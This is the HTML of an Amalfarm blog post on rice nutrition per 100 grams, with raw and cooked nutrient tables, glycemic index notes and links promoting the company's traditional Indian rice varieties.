	<li id="nav-menu-item-1044" class="menu-item menu-item-type-post_type menu-item-object-page" data-cols="1"><a href="https://www.amalfarm.com/why-choose-our-products/">Why Choose Amalfarm Products</a></li>
	<li id="nav-menu-item-1043" class="menu-item menu-item-type-post_type menu-item-object-page" data-cols="1"><a href="https://www.amalfarm.com/team/">Team</a></li>
</ul></div></div>
</li>
<li id="nav-menu-item-783" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children has-sub narrow"><a href="https://www.amalfarm.com/shop/">Shop</a>
<div class="popup"><div class="inner" style=""><ul class="sub-menu porto-narrow-sub-menu">
	<li id="nav-menu-item-6512" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat" data-cols="1"><a href="https://www.amalfarm.com/product-category/festival-gift/">Festival Gift</a></li>
	<li id="nav-menu-item-3223" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat" data-cols="1"><a href="https://www.amalfarm.com/product-category/dry-fruits-and-nuts/">Dry Fruits and Nuts</a></li>
	<li id="nav-menu-item-7398" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat" data-cols="1"><a href="https://www.amalfarm.com/product-category/odop/">ODOP</a></li>
	<li id="nav-menu-item-3225" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat" data-cols="1"><a href="https://www.amalfarm.com/product-category/rice-and-poha/">Rice and Poha</a></li>
	<li id="nav-menu-item-3226" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat" data-cols="1"><a href="https://www.amalfarm.com/product-category/spices/">Spices</a></li>
	<li id="nav-menu-item-3224" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat" data-cols="1"><a href="https://www.amalfarm.com/product-category/tester-packs/">Tester Packs</a></li>
	<li id="nav-menu-item-6185" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat" data-cols="1"><a href="https://www.amalfarm.com/product-category/flour-and-pulses/">Flour and pulses</a></li>
</ul></div></div>
</li>
<li id="nav-menu-item-781" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children has-sub narrow"><a href="https://www.amalfarm.com/blog/">Blog</a>
<div class="popup"><div class="inner" style=""><ul class="sub-menu porto-narrow-sub-menu">
	<li id="nav-menu-item-6198" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent active" data-cols="1"><a href="https://www.amalfarm.com/category/food/">Food</a></li>
	<li id="nav-menu-item-6199" class="menu-item menu-item-type-taxonomy menu-item-object-category" data-cols="1"><a href="https://www.amalfarm.com/category/news/">News</a></li>
</ul></div></div>
</li>
<li id="nav-menu-item-3254" class="menu-item menu-item-type-post_type menu-item-object-page narrow"><a href="https://www.amalfarm.com/farmer-story/">Farmer Story</a></li>
<li id="nav-menu-item-810" class="menu-item menu-item-type-post_type menu-item-object-page narrow"><a href="https://www.amalfarm.com/contact-us/">Contact Us</a></li>
<li id="nav-menu-item-9007" class="menu-item menu-item-type-post_type menu-item-object-page narrow"><a href="https://www.amalfarm.com/my-account/"><i class="fa fa-regular fa-user"></i>Login</a></li>
</ul></div><div class="header-col header-right hidden-for-sm"><div class="searchform-popup search-popup simple-search-layout search-dropdown search-rounded"><a  class="search-toggle" aria-label="Search Toggle" href="#"><i class="porto-icon-magnifier"></i><span class="search-text">Search</span></a>	<form action="https://www.amalfarm.com/" method="get"
		class="searchform search-layout-simple">
		<div class="searchform-fields">
			<span class="text"><input name="s" type="text" value="" placeholder="Search&hellip;" autocomplete="off" /></span>
						<span class="button-wrap">
				<button class="btn btn-special" title="Search" type="submit">
					<i class="porto-icon-magnifier"></i>
				</button>
							</span>
		</div>
				<div class="live-search-list"></div>
			</form>
	</div><a href="https://www.amalfarm.com/my-account/" title="My Account" class="my-account  porto-link-login"><i class="porto-icon-user-2"></i></a><style>@media (min-width: 992px ) {
    #header .my-wishlist, #header .my-account { display: none; }
}
@media(max-width: 991px) {
    #header .searchform-popup, .header-main .porto-block { display: none; }
}</style><div class="porto-block elementor elementor-120" data-id="120">		<div data-elementor-type="wp-post" data-elementor-id="120" class="elementor elementor-120">
						<div class="elementor-section elementor-top-section elementor-element elementor-element-697f09a6 text-left mr-2 pr-1 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="697f09a6" data-element_type="section">
		
							<div class="elementor-container elementor-column-gap-default">
											<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-4dcce230" data-id="4dcce230" data-element_type="column">
					<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-6db159c elementor-hidden-desktop elementor-widget elementor-widget-porto_info_box" data-id="6db159c" data-element_type="widget" data-widget_type="porto_info_box.default">
				<div class="elementor-widget-container">
			<a class="porto-sicon-box-link" href="http://amalfarm.com/my-account/"><div class="porto-sicon-box style_1 default-icon"><div class="porto-sicon-default"><div class="porto-just-icon-wrapper porto-icon none" style="margin-right:5px;"><i class="porto-icon-user-2"></i></div></div></div><!-- porto-sicon-box --></a>		</div>
				</div>
					</div>
				</div>
					</div>
				</div>
				</div>
		</div>		<div id="mini-cart" class="mini-cart minicart-arrow-alt">
			<div class="cart-head">
			<span class="cart-icon"><i class="minicart-icon porto-icon-bag-2"></i><span class="cart-items">0</span></span><span class="cart-items-text">0 items</span>			</div>
			<div class="cart-popup widget_shopping_cart">
				<div class="widget_shopping_cart_content">
									<div class="cart-loading"></div>
								</div>
			</div>
				</div>
		</div><div class="header-col visible-for-sm header-right"><div class="searchform-popup search-popup simple-search-layout search-dropdown search-rounded"><a  class="search-toggle" aria-label="Search Toggle" href="#"><i class="porto-icon-magnifier"></i><span class="search-text">Search</span></a>	<form action="https://www.amalfarm.com/" method="get"
		class="searchform search-layout-simple">
		<div class="searchform-fields">
			<span class="text"><input name="s" type="text" value="" placeholder="Search&hellip;" autocomplete="off" /></span>
						<span class="button-wrap">
				<button class="btn btn-special" title="Search" type="submit">
					<i class="porto-icon-magnifier"></i>
				</button>
							</span>
		</div>
				<div class="live-search-list"></div>
			</form>
	</div><a href="https://www.amalfarm.com/my-account/" title="My Account" class="my-account  porto-link-login"><i class="porto-icon-user-2"></i></a>		<div id="mini-cart" class="mini-cart minicart-arrow-alt">
			<div class="cart-head">
			<span class="cart-icon"><i class="minicart-icon porto-icon-bag-2"></i><span class="cart-items">0</span></span><span class="cart-items-text">0 items</span>			</div>
			<div class="cart-popup widget_shopping_cart">
				<div class="widget_shopping_cart_content">
									<div class="cart-loading"></div>
								</div>
			</div>
				</div>
		</div></div></div>	</header>

									</div>
				<!-- end header wrapper -->
			
			
					<section class="page-top page-header-6">
	<div class="container hide-title">
	<div class="row">
		<div class="col-lg-12 clearfix">
			<div class="pt-right d-none">
								<h1 class="page-title">Rice Nutrition Facts 100g: Complete Nutritional Guide</h1>
							</div>
							<div class="breadcrumbs-wrap pt-left">
					<ul class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><li class="home" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a itemprop="item" href="https://www.amalfarm.com" title="Go to Home Page"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /><i class="delimiter delimiter-2"></i></li><li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a itemprop="item" href="https://www.amalfarm.com/blog/"><span itemprop="name">Blog</span></a><meta itemprop="position" content="2" /><i class="delimiter delimiter-2"></i></li><li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a itemprop="item" href="https://www.amalfarm.com/category/food/"><span itemprop="name">Food</span></a><meta itemprop="position" content="3" /><i class="delimiter delimiter-2"></i></li><li>Rice Nutrition Facts 100g: Complete Nutritional Guide</li></ul>				</div>
								</div>
	</div>
</div>
	</section>
	
		<div id="main" class="column2 column2-right-sidebar boxed"><!-- main -->

			<div class="container">
			<div class="row main-content-wrap">

			<!-- main content -->
			<div class="main-content col-lg-9">

			
<div id="content" role="main" class="porto-single-page">

	
			
<article class="post-modern hide-post-date post-title-simple post-10127 post type-post status-publish format-standard has-post-thumbnail hentry category-food tag-rice-nutrition">

		<div class="post-image single">
		<div class="post-slideshow porto-carousel owl-carousel has-ccols ccols-1  nav-inside nav-inside-center nav-style-2 show-nav-hover" data-plugin-options='{"nav":true}'>
											<div>
								<div class="img-thumbnail">
						<img width="1536" height="1024" src="https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm.png" class="owl-lazy img-responsive" alt="Rice Nutrition Facts 100gm" decoding="async" fetchpriority="high" srcset="https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm.png 1536w, https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm-1024x683.png 1024w, https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm-768x512.png 768w, https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm-640x427.png 640w, https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm-400x267.png 400w, https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm-600x400.png 600w" sizes="(max-width: 1536px) 100vw, 1536px" />											</div>
								</div>
								</div>
		
			</div>
	
			<div class="post-date">
					</div>
	
	<div class="post-content">
					<h2 class="entry-title">Rice Nutrition Facts 100g: Complete Nutritional Guide</h2>
				<span class="vcard" style="display: none;"><span class="fn"><a href="https://www.amalfarm.com/author/amalfarm/" rel="author">amalfarm</a></span></span><span class="updated" style="display:none">2025-09-11T11:56:58+00:00</span>
<div class="post-meta ">
				
	
	</div>

		<div class="entry-content">
					<div data-elementor-type="wp-post" data-elementor-id="10127" class="elementor elementor-10127">
						<section class="elementor-section elementor-top-section elementor-element elementor-element-bdfe5d0 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="bdfe5d0" data-element_type="section">
		
							<div class="elementor-container elementor-column-gap-default">
											<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-eb5d5b2" data-id="eb5d5b2" data-element_type="column">
					<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-54df1d6 elementor-widget elementor-widget-image" data-id="54df1d6" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img decoding="async" width="930" height="300" src="https://www.amalfarm.com/wp-content/uploads/porto_placeholders/100x32.jpg" data-oi="https://www.amalfarm.com/wp-content/uploads/2025/09/Rice-Nutrition-Facts.jpg" class="porto-lazyload attachment-large size-large wp-image-10128" alt="Rice Nutrition Facts per 100gm" srcset="https://www.amalfarm.com/wp-content/uploads/porto_placeholders/100x32.jpg 100w" data-srcset="https://www.amalfarm.com/wp-content/uploads/2025/09/Rice-Nutrition-Facts.jpg 930w, https://www.amalfarm.com/wp-content/uploads/2025/09/Rice-Nutrition-Facts-768x248.jpg 768w, https://www.amalfarm.com/wp-content/uploads/2025/09/Rice-Nutrition-Facts-640x206.jpg 640w, https://www.amalfarm.com/wp-content/uploads/2025/09/Rice-Nutrition-Facts-400x129.jpg 400w, https://www.amalfarm.com/wp-content/uploads/2025/09/Rice-Nutrition-Facts-600x194.jpg 600w" sizes="(max-width: 930px) 100vw, 930px" />													</div>
				</div>
				<div class="elementor-element elementor-element-b22119b elementor-widget elementor-widget-text-editor" data-id="b22119b" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Understanding <strong data-start="152" data-end="181">rice nutrition facts 100g</strong> is essential for making informed and healthy dietary choices. Rice is a staple food consumed by billions of people worldwide, providing a major source of energy and nutrients. Its nutritional content, however, can vary depending on several factors—such as the type of rice (white, brown, basmati, or traditional Indian varieties), whether it is raw or cooked, and even the region and conditions in which it was grown. By knowing these details—including calories, protein, carbohydrates, fiber, vitamins, and minerals—you can plan balanced, wholesome meals that not only satisfy your hunger but also support your overall health, energy levels, and long-term wellness goals. This guide offers a comprehensive overview so you can understand how rice nutrition can change and make the best choices for your dietary needs.</p><h2>Rice Nutrition Facts 100g: Raw vs Cooked &#8211; The Complete Breakdown</h2><p>The nutritional content varies significantly between raw and cooked rice due to water absorption during the cooking process. When rice cooks, it absorbs water and expands, which dilutes the nutrient concentration per 100g serving.</p><h2>Raw Rice Nutrition Per 100g (Uncooked)</h2><table class="w-fit min-w-(--thread-content-width)" data-start="120" data-end="983"><thead data-start="120" data-end="215"><tr data-start="120" data-end="215"><th data-start="120" data-end="137" data-col-size="sm">Nutrient</th><th data-start="137" data-end="148" data-col-size="sm">Amount</th><th data-start="148" data-end="164" data-col-size="sm">Daily Value %</th><th data-start="164" data-end="215" data-col-size="md">Health Benefits</th></tr></thead><tbody data-start="312" data-end="983"><tr data-start="312" data-end="407"><td data-start="312" data-end="329" data-col-size="sm">Calories</td><td data-start="329" data-end="340" data-col-size="sm">365 kcal</td><td data-start="340" data-end="356" data-col-size="sm">18%</td><td data-start="356" data-end="407" data-col-size="md">Primary energy source for body functions</td></tr><tr data-start="408" data-end="503"><td data-start="408" data-end="425" data-col-size="sm">Carbohydrates</td><td data-start="425" data-end="436" data-col-size="sm">80g</td><td data-start="436" data-end="452" data-col-size="sm">27%</td><td data-start="452" data-end="503" data-col-size="md">Main fuel for brain and muscle function</td></tr><tr data-start="504" data-end="599"><td data-start="504" data-end="521" data-col-size="sm">Protein</td><td data-start="521" data-end="532" data-col-size="sm">7g</td><td data-start="532" data-end="548" data-col-size="sm">14%</td><td data-start="548" data-end="599" data-col-size="md">Essential for muscle building and repair</td></tr><tr data-start="600" data-end="695"><td data-start="600" data-end="617" data-col-size="sm">Fat</td><td data-start="617" data-end="628" data-col-size="sm">0.6g</td><td data-start="628" data-end="644" data-col-size="sm">1%</td><td data-start="644" data-end="695" data-col-size="md">Minimal fat content, heart-friendly</td></tr><tr data-start="696" data-end="791"><td data-start="696" data-end="713" data-col-size="sm">Fiber</td><td data-start="713" data-end="724" data-col-size="sm">1.3g</td><td data-start="724" data-end="740" data-col-size="sm">5%</td><td data-start="740" data-end="791" data-col-size="md">Supports digestive health and satiety</td></tr><tr data-start="792" data-end="887"><td data-start="792" data-end="809" data-col-size="sm">Iron</td><td data-start="809" data-end="820" data-col-size="sm">0.8mg</td><td data-start="820" data-end="836" data-col-size="sm">4%</td><td data-start="836" data-end="887" data-col-size="md">Prevents anemia, supports oxygen transport</td></tr><tr data-start="888" data-end="983"><td data-start="888" data-end="905" data-col-size="sm">Calcium</td><td data-start="905" data-end="916" data-col-size="sm">28mg</td><td data-start="916" data-end="932" data-col-size="sm">3%</td><td data-start="932" data-end="983" data-col-size="md">Strengthens bones and teeth</td></tr></tbody></table>						</div>
				</div>
				<div class="elementor-element elementor-element-0c19020 elementor-widget elementor-widget-text-editor" data-id="0c19020" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<h2>Cooked Rice Nutrition Per 100g (Ready to Eat)</h2><table class="w-fit min-w-(--thread-content-width)" data-start="84" data-end="1113"><thead data-start="84" data-end="211"><tr data-start="84" data-end="211"><th data-start="84" data-end="101" data-col-size="sm">Nutrient</th><th data-start="101" data-end="114" data-col-size="sm">White Rice</th><th data-start="114" data-end="127" data-col-size="sm">Brown Rice</th><th data-start="127" data-end="164" data-col-size="sm">Difference</th><th data-start="164" data-end="211" data-col-size="sm">Why It Matters</th></tr></thead><tbody data-start="340" data-end="1113"><tr data-start="340" data-end="468"><td data-start="340" data-end="357" data-col-size="sm">Calories</td><td data-start="357" data-end="370" data-col-size="sm">130 kcal</td><td data-start="370" data-end="383" data-col-size="sm">112 kcal</td><td data-start="383" data-end="420" data-col-size="sm">Brown rice has 14% fewer calories</td><td data-start="420" data-end="468" data-col-size="sm">Better for weight management</td></tr><tr data-start="469" data-end="597"><td data-start="469" data-end="486" data-col-size="sm">Carbohydrates</td><td data-start="486" data-end="499" data-col-size="sm">28g</td><td data-start="499" data-end="512" data-col-size="sm">23g</td><td data-start="512" data-end="549" data-col-size="sm">Brown rice has 18% fewer carbs</td><td data-start="549" data-end="597" data-col-size="sm">Lower impact on blood sugar</td></tr><tr data-start="598" data-end="726"><td data-start="598" data-end="615" data-col-size="sm">Protein</td><td data-start="615" data-end="628" data-col-size="sm">2.7g</td><td data-start="628" data-end="641" data-col-size="sm">2.6g</td><td data-start="641" data-end="678" data-col-size="sm">Nearly identical protein</td><td data-start="678" data-end="726" data-col-size="sm">Both provide essential amino acids</td></tr><tr data-start="727" data-end="855"><td data-start="727" data-end="744" data-col-size="sm">Fat</td><td data-start="744" data-end="757" data-col-size="sm">0.3g</td><td data-start="757" data-end="770" data-col-size="sm">0.9g</td><td data-start="770" data-end="807" data-col-size="sm">Brown rice has 3x more healthy fats</td><td data-start="807" data-end="855" data-col-size="sm">Contains beneficial fatty acids</td></tr><tr data-start="856" data-end="984"><td data-start="856" data-end="873" data-col-size="sm">Fiber</td><td data-start="873" data-end="886" data-col-size="sm">0.4g</td><td data-start="886" data-end="899" data-col-size="sm">1.8g</td><td data-start="899" data-end="936" data-col-size="sm">Brown rice has 4.5x more fiber</td><td data-start="936" data-end="984" data-col-size="sm">Better for digestion and heart health</td></tr><tr data-start="985" data-end="1113"><td data-start="985" data-end="1002" data-col-size="sm">Water Content</td><td data-start="1002" data-end="1015" data-col-size="sm">~68%</td><td data-start="1015" data-end="1028" data-col-size="sm">~70%</td><td data-start="1028" data-end="1065" data-col-size="sm">High water content in both</td><td data-start="1065" data-end="1113" data-col-size="sm">Contributes to daily hydration needs</td></tr></tbody></table>						</div>
				</div>
				<div class="elementor-element elementor-element-c2d1e4c elementor-widget elementor-widget-text-editor" data-id="c2d1e4c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p><span style="text-decoration: underline;"><em>The difference in nutrition facts between raw and cooked rice occurs because cooked rice contains about 70% water, which significantly dilutes the nutrient concentration.</em></span></p><h2 class="text-lg font-bold text-text-100 mt-1 -mb-1.5"><strong>Key Nutritional Insights:</strong></h2><h2 data-start="2457" data-end="2495">Glycemic Index and Energy Release</h2><p data-start="2497" data-end="2871">White rice has a <strong data-start="2514" data-end="2546">high glycemic index (GI ~73)</strong>, which means it causes a rapid spike in blood sugar levels. Brown rice, on the other hand, has a <strong data-start="2644" data-end="2678">medium glycemic index (GI ~68)</strong> and releases energy more gradually. Its higher fiber content slows down carbohydrate absorption, making it a better option for people looking to manage blood sugar or maintain steady energy.</p><hr data-start="2873" data-end="2876" /><h2 data-start="2878" data-end="2898">Protein Quality</h2><p data-start="2900" data-end="3215">Rice protein contains all essential amino acids, but it is relatively low in lysine. When combined with legumes such as dal, beans, or lentils, rice becomes a <strong data-start="3059" data-end="3086">complete protein source</strong>—comparable to the quality of protein found in meat. This makes rice and dal a perfect traditional combination for vegetarians.</p><hr data-start="3217" data-end="3220" /><h2 data-start="3222" data-end="3277">Calories in Different Rice Types (per 100g cooked)</h2><ul data-start="3279" data-end="3414"><li data-start="3279" data-end="3311"><p data-start="3281" data-end="3311"><strong data-start="3281" data-end="3296">White Rice:</strong> 130 calories</p></li><li data-start="3312" data-end="3344"><p data-start="3314" data-end="3344"><strong data-start="3314" data-end="3329">Brown Rice:</strong> 112 calories</p></li><li data-start="3345" data-end="3379"><p data-start="3347" data-end="3379"><strong data-start="3347" data-end="3364">Basmati Rice:</strong> 121 calories</p></li><li data-start="3380" data-end="3414"><p data-start="3382" data-end="3414"><strong data-start="3382" data-end="3399">Jasmine Rice:</strong> 129 calories</p></li></ul><p data-start="3416" data-end="3521">For portion control, keep in mind that 100g of cooked rice equals roughly half a cup or one small bowl.</p><hr data-start="3523" data-end="3526" /><h2 data-start="3528" data-end="3572">Essential Vitamins and Minerals in Rice</h2><p data-start="3574" data-end="3889">Rice is not just about calories and carbs—it also provides important micronutrients. It contains <strong data-start="3671" data-end="3683">vitamins</strong> like Thiamine (B1), Niacin (B3), Vitamin B6, and Folate, along with <strong data-start="3752" data-end="3764">minerals</strong> such as Manganese, Selenium, Magnesium, and Phosphorus, all of which support energy metabolism, immunity, and bone health.</p><hr data-start="3891" data-end="3894" /><h2 data-start="3896" data-end="3930">Premium Indian Rice Varieties</h2><p data-start="3932" data-end="4023">India is home to several traditional rice varieties with exceptional taste and nutrition:</p><ul data-start="4025" data-end="4282"><li data-start="4025" data-end="4110"><p data-start="4027" data-end="4110"><strong data-start="4027" data-end="4046"><a href="https://www.amalfarm.com/product/siddharthnagar-kalanamak-rice/">Kalanamak Rice</a>:</strong> Richer in protein with a unique black-tipped grain and aroma.</p></li><li data-start="4111" data-end="4192"><p data-start="4113" data-end="4192"><strong data-start="4113" data-end="4134"><a href="https://www.amalfarm.com/product/bengal-gobindobhog-rice/">Gobindobhog Rice</a>:</strong> Famous for its aromatic quality and balanced nutrition.</p></li><li data-start="4193" data-end="4282"><p data-start="4195" data-end="4282"><strong data-start="4195" data-end="4212"><a href="https://www.amalfarm.com/product/bhagalpur-katarni-rice/">Katarni Rice</a>:</strong> A traditional variety known for its flavor and wholesome nutrition.</p></li></ul><p data-start="4284" data-end="4386"><a href="https://www.amalfarm.com/product-category/rice-and-poha/">Buying these premium varieties online</a> ensures freshness and quality directly from authentic sources.</p><hr data-start="4388" data-end="4391" /><h2 data-start="4393" data-end="4408">Conclusion</h2><p data-start="4410" data-end="4810">Rice nutrition facts per 100g show that rice is an excellent source of energy, offering essential carbohydrates, moderate protein, and valuable vitamins and minerals. White rice provides quick energy, while brown rice adds fiber and better blood sugar control. By understanding these differences, you can make smarter dietary choices—whether for daily meals, weight management, or overall wellness.</p>						</div>
				</div>
					</div>
				</div>
					</div>
				</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-9e1892c elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="9e1892c" data-element_type="section">
		
							<div class="elementor-container elementor-column-gap-default">
											<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-01ed140" data-id="01ed140" data-element_type="column">
					<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-5a08db2 elementor-widget elementor-widget-text-editor" data-id="5a08db2" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p class="whitespace-normal break-words"> </p><hr class="border-border-300 my-2" /><p class="whitespace-normal break-words"><em>Learn more: <a class="underline" href="https://www.amalfarm.com/rice-producing-states-in-india/">Rice Producing States in India</a> | <a class="underline" href="https://www.amalfarm.com/types-of-indian-rice/">Types of Indian Rice</a></em></p>						</div>
				</div>
					</div>
				</div>
					</div>
				</section>
				</div>
		
			<!-- Post meta after content -->
					</div>

	</div>

				
	

			
	
</article>
			</div>

		

</div><!-- end main content -->

<div class="sidebar-overlay"></div>	<div class="col-lg-3 sidebar porto-blog-sidebar right-sidebar mobile-sidebar"><!-- main sidebar -->
				<div data-plugin-sticky data-plugin-options="{&quot;autoInit&quot;: true, &quot;minWidth&quot;: 992, &quot;containerSelector&quot;: &quot;.main-content-wrap&quot;,&quot;autoFit&quot;:true, &quot;paddingOffsetBottom&quot;: 10}">
							<div class="sidebar-toggle"><i class="fa"></i></div>
				<div class="sidebar-content">
						<aside id="search-2" class="widget widget_search">
<form method="get" id="searchform" class="searchform" action="https://www.amalfarm.com/">
	<div class="input-group">
		<input class="form-control" placeholder="Search&hellip;" name="s" id="s" type="text">
		<button type="submit" class="btn btn-dark p-2"><i class="d-inline-block porto-icon-search-3"></i></button>
	</div>
</form>
</aside>
		<aside id="recent-posts-3" class="widget widget_recent_entries">
		<h3 class="widget-title">Recent Posts</h3>
		<ul>
											<li>
					<a href="https://www.amalfarm.com/katarni-rice-benefits/">Katarni Rice Benefits: 5 Amazing Health Benefits You Must Know</a>
											<span class="post-date">November 6, 2025</span>
									</li>
											<li>
					<a href="https://www.amalfarm.com/how-to-store-rice/">How to Store Rice for Long Time: Simple Guide for Fresh Rice</a>
											<span class="post-date">October 28, 2025</span>
									</li>
											<li>
					<a href="https://www.amalfarm.com/is-raw-rice-good-for-health/">Is Raw Rice Good for Health? Understanding Its Benefits and Risks</a>
											<span class="post-date">October 23, 2025</span>
									</li>
					</ul>

		</aside><aside id="categories-3" class="widget widget_categories"><h3 class="widget-title">Categories</h3>
			<ul>
					<li class="cat-item cat-item-1"><a href="https://www.amalfarm.com/category/food/">Food</a> (83)
</li>
	<li class="cat-item cat-item-39"><a href="https://www.amalfarm.com/category/news/">News</a> (4)
</li>
			</ul>

			</aside>		</div>
				</div>
					</div><!-- end main sidebar -->


	</div>
	</div>

					
				
				</div><!-- end main -->

				
				<div class="footer-wrapper">

																												
							<div id="footer" class="footer footer-1"
>
			<div class="footer-main">
			<div class="container">
				
									<div class="row">
														<div class="col-lg-4">
									<aside id="text-2" class="widget widget_text">			<div class="textwidget"><p><a href="http://amalfarm.com/"><img decoding="async" style="margin-bottom: 10px;" src="https://amalfarm.com/wp-content/uploads/2021/12/Amal_Farm_Logo_180x65_Reg_white.png" /></a><br />
<strong>AMALFARM SOLUTIONS PVT LTD</strong><br />
Shrachi Ek Tower, Office 6C,<br />
Unit-6, Action Area-II D,<br />
Rajarhat, New Town,<br />
North 24 Parganas,<br />
West Bengal, 700161. INDIA<br />
Phone: <a href="tel:+91-9625576376">+91 9625576376</a><br />
Mail: <a href="mailto:wecare@amalfarm.com">wecare@amalfarm.com</a></p>
</div>
		</aside>								</div>
																<div class="col-lg-2">
									<aside id="text-3" class="widget widget_text"><h3 class="widget-title">Quick Links</h3>			<div class="textwidget"><ul>
<li><a href="https://amalfarm.com/about-us/">About Us</a></li>
<li><a href="https://amalfarm.com/shop/">Products</a></li>
<li><a href="https://amalfarm.com/my-account/">My Account</a></li>
<li><a href="https://amalfarm.com/cart/">Cart</a></li>
<li><a href="http://amalfarm.com/contact-us/">Contact Us</a></li>
<li><a href="https://amalfarm.com/scan-your-food/">Scan Your Food</a></li>
</ul>
</div>
		</aside>								</div>
																<div class="col-lg-2">
									<aside id="text-4" class="widget widget_text"><h3 class="widget-title">Policies</h3>			<div class="textwidget"><ul>
<li><a href="https://amalfarm.com/privacy-policy/">Privacy Policy</a></li>
<li><a href="https://amalfarm.com/terms-of-service/">Terms of Service</a></li>
<li><a href="https://amalfarm.com/refund-poilcy/">Refund Policy</a></li>
<li><a href="https://amalfarm.com/shipping-policy/">Shipping Policy</a></li>
</ul>
</div>
		</aside>								</div>
																<div class="col-lg-4">
									<aside id="follow-us-widget-2" class="widget follow-us"><h3 class="widget-title">Social media</h3>		<div class="share-links">
										<a href="https://www.facebook.com/amalfarmindia/"  rel=&quot;nofollow noopener noreferrer&quot; target="_blank" title="Facebook" class="share-facebook">Facebook</a>
								<a href="https://twitter.com/amalfarmindia/"  rel=&quot;nofollow noopener noreferrer&quot; target="_blank" title="X" class="share-twitter">Twitter</a>
								<a href="https://www.youtube.com/channel/UCjjhBCeQf21YKCWasNWFD8A"  rel=&quot;nofollow noopener noreferrer&quot; target="_blank" title="Youtube" class="share-youtube">Youtube</a>
								<a href="https://www.instagram.com/amalfarmindia/"  rel=&quot;nofollow noopener noreferrer&quot; target="_blank" title="Instagram" class="share-instagram">Instagram</a>
								<a href="https://www.linkedin.com/company/amalfarmindia/"  rel=&quot;nofollow noopener noreferrer&quot; target="_blank" title="Linkedin" class="share-linkedin">Linkedin</a>
									</div>

		</aside><aside id="custom_html-2" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><h4 class="widget-title">We are also available on:</h4>
<div class="also-available">
	<a href="https://www.amazon.in/s?k=Amalfarm&ref=bl_dp_s_web_0" target="_blank"><img src="https://amalfarm.com/wp-content/uploads/2021/07/amazon_logo2_150x.png" alt="amazon"></a>
	<a href="https://www.flipkart.com/search?q=amalfarm&otracker=search&otracker1=search&marketplace=FLIPKART&as-show=on&as=off&augment=false" target="_blank"><img src="https://amalfarm.com/wp-content/uploads/2021/10/Flip.png" alt="amazon"></a>
	<a href="https://www.1mg.com/search/all?name=Amalfarm" target="_blank"><img src="https://amalfarm.com/wp-content/uploads/2021/12/Tata-1mg-logo1.png" alt="amazon"></a>
	<a href="https://www.jiomart.com/groceries/b/amalfarm/69202?prod_mart_groceries_products_popularity%5Bpage%5D=3" target="_blank"><img src="https://amalfarmbulk.com/wp-content/uploads/2023/12/jio-mart-logo.png" alt="amazon"></a>
</div></div></aside>								</div>
													</div>
				
							</div>
		</div>
	
	<div class="footer-bottom">
	<div class="container">
		
					<div class="footer-center">
								<span class="footer-copyright">Copyright  ©  2023 Amalfarm.  All Rights Reserved.</span>			</div>
		
			</div>
</div>
</div>
												
					
				</div>
							
					
	</div><!-- end wrapper -->
	
<div class="panel-overlay" ></div>
<a href="#" aria-label="Mobile Close" class="side-nav-panel-close"><svg width="1.5rem" height="1.5rem" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><g id="cross"><line stroke="#fff" stroke-width="2px" x1="7" x2="25" y1="7" y2="25"/><line stroke="#fff" stroke-width="2px" x1="7" x2="25" y1="25" y2="7"/></g></svg></a>
<div id="side-nav-panel" class="panel-left">
	
	<div class="menu-wrap"><ul id="menu-menu1-1" class="mobile-menu accordion-menu"><li id="accordion-menu-item-780" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home"><a href="https://www.amalfarm.com/">Home</a></li>
<li id="accordion-menu-item-1038" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children has-sub"><a class="nolink" href="#">About Us</a>
<span aria-label="Open Submenu" class="arrow" role="button"></span><ul class="sub-menu">
	<li id="accordion-menu-item-782" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.amalfarm.com/about-us/">About Us</a></li>
	<li id="accordion-menu-item-1044" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.amalfarm.com/why-choose-our-products/">Why Choose Amalfarm Products</a></li>
	<li id="accordion-menu-item-1043" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.amalfarm.com/team/">Team</a></li>
</ul>
</li>
